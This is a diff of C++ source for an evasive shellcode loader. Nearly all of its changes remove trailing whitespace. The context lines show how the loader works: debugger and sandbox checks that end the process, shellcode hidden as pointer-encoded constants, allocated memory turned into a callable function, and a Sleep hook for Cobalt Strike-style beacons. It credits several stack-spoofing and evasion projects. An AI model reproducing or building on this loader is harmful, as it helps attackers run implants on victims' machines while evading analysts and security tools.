@@ -1,22 +1,22 @@
 /*
 * Credits
-* 
+*
 * MDSec - Resolving System Service Numbers using the Exception Directory
 * https://www.mdsec.co.uk/2022/04/resolving-system-service-numbers-using-the-exception-directory/
-* 
+*
 * cpu0x00 - Ghost: Evasive shellcode loader
 * https://github.com/cpu0x00/Ghost
-* 
+*
 * susMdT - LoudSunRun: Stack Spoofing with Synthetic frames based on the work of namazso, SilentMoonWalk, and VulcanRaven
 * https://github.com/susMdT/LoudSunRun
 *
 * HulkOperator - x64 Call Stack Spoofing
 * https://hulkops.gitbook.io/blog/red-team/x64-call-stack-spoofing
 * https://github.com/HulkOperator/CallStackSpoofer
-* 
+*
 * Jan Vojtesek - Raspberry Robin's Roshtyak: A Little Lesson in Trickery
 * https://decoded.avast.io/janvojtesek/raspberry-robins-roshtyak-a-little-lesson-in-trickery/
-* 
+*
 * dadevel - Detecting Sandboxes Without Syscalls
 * https://pentest.party/posts/2024/detecting-sandboxes-without-syscalls/
 */
@@ -56,7 +56,7 @@ std::unique_ptr<char[]> unASCIIme(const int* asciiValues, size_t length) {
 
 VOID RunMe() {
 	const PKUSER_SHARED_DATA ksd = (PKUSER_SHARED_DATA)KUSER_SHARED_DATA_ADDRESS;
-	
+
 	// Check if Secure Boot is enabled
 	if (!ksd->DbgSecureBootEnabled) __fastfail(0xc00000022); // Exit process if Secure Boot is disabled
 
@@ -68,7 +68,7 @@ VOID RunMe() {
 	time1.LowPart = ksd->InterruptTime.LowPart;
 	time1.HighPart = ksd->InterruptTime.High2Time;
 	//if ((time1.QuadPart / TICKS_PER_SECOND / 60 / 60) < 1) __fastfail(0xc00000022); // Exit process if uptime is less than 1 hour
-	
+
 	//if (ksd->BootId < 100) __fastfail(0xc00000022); // Exit process if boot count is less than 100
 
 	// Check for KdDebuggerEnabled
@@ -98,9 +98,9 @@ VOID RunMe() {
 		sizeof(debugFlags),
 		NULL
 	)) && debugFlags) __fastfail(0xC0000409); // Exit process if debugger is detected
-	
+
 	// Shellcode deobfuscation and preparation
-	
+
 	PVOID cHzWuUOLpKshEZso = EncodePointer((PVOID)0x4831c94881e9d4ff);
 	PVOID qzmcczftlrofpMBK = EncodePointer((PVOID)0xffff488d05efffff);
 	PVOID BnFPxxUTdHzXfBou = EncodePointer((PVOID)0xff48bb44f6a40b5f);
@@ -221,7 +221,7 @@ VOID RunMe() {
 
 	// Create a callable "function" from the allocated space
 	void (*shellcodeFunc)() = (void(*)())baseAddress;
-	
+
 	// Hook Sleep and SleepEx for CS beacons
 	ReSleep();
 
